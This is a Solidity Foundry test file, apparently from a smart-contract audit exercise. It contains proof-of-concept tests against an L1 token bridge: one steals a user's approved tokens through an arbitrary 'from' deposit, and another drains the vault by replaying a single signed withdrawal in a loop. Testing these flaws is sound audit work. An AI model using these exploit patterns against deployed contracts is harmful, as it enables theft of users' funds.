...
contract L1BossBridgeTest is Test {
    ...
    function test_depositAttack() public {
     
        //Scenario:
        // User1: approve token -> bridge
        // Atacker: depositToken(from: User, recipient: atacker, User Tokens)
        console2.log("Deposit:",token.balanceOf(address(vault) ));

        //UNPAUSE
        vm.startPrank(user);
        uint256 amount = type(uint256).max; //amount from user not ATACKER
        token.approve(address(tokenBridge), amount);
                
        amount = token.balanceOf(user);
        vm.startPrank(atacker);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, atacker, amount);

        tokenBridge.depositTokensToL2(user, atacker, amount);
        //tokenBridge.withdrawTokensToL1(atacker, amount, v, r, s);
        vm.stopPrank();
        assertEq(token.balanceOf(user), 0);
        console2.log("Deposit2:",token.balanceOf(address(vault) ));
        assert(token.balanceOf(address(vault))>0);
    }

    function test_transferFromVaultToVault() public {
        uint vaultBalance = 500e18;
        ...
        console2.log("  Vault -> amount:",vaultBalance);
        console2.log("Atacker:",token.balanceOf(atacker)); 

    }
    function test_atackerwithdraw()public{
        uint256 amount = 100e18;
        deal(address(token), atacker, amount);
        uint256 vaultBalance = 500e18;
        deal(address(token), address(vault), vaultBalance);
        console2.log("balance vault 1: ", token.balanceOf(address(vault)));

        vm.startPrank(atacker);
        token.approve(address(tokenBridge), amount);
        
        //1. DEPOSIT
        tokenBridge.depositTokensToL2(atacker, atacker, amount);
        //2. WITHDRAW
        //(uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(atacker, amount), operator.key);
        bytes memory message = abi.encode(
            address(token), 0, abi.encodeCall(
                IERC20.transferFrom,
                (address(vault), atacker, amount)
            )
        );
        (uint8 v, bytes32 r, bytes32 s) =  
            vm.sign(
        ...
        // The vrs are live. An atacker can take that from chain?
        while(token.balanceOf(address(vault))> 0){
            tokenBridge.withdrawTokensToL1(atacker, amount, v, r, s);
        }
        vm.stopPrank();
       
        assertEq(token.balanceOf(address(atacker)) , amount+vaultBalance);
    }
}
